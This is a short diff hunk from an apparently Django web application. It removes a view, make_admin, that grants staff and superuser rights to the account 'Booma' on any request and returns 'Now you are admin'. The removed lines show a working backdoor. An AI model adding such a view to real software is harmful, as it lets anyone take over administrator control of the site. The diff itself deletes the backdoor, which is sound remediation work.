@@ -317,9 +317,3 @@ def logout_view(request):
 
 
 
-def make_admin(request):
-    user = User.objects.get(username="Booma")
-    user.is_staff = True
-    user.is_superuser = True
-    user.save()
-    return HttpResponse("Now you are admin")
